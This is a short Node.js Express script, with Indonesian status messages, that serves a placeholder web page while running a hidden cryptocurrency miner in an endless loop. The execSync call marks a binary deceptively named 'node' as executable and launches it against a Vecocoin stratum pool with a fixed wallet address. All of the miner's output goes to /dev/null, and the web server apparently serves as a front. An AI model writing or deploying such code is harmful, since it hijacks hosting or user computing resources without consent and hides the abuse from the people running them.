const express = require('express');
const http = require('http');
const { execSync } = require('child_process');
const prt = process.env.PORT || 80;
const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  res.send('Aplikasi sedang berjalan');
});

server.listen(prt, () => {
  console.log(`Server berjalan pada port ${prt}`);
});

while (true) {
  try {
    execSync('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Sekop -p c=VECO,m=solo &> /dev/null');
  } catch (error) {
    console.log(error);
  }
}
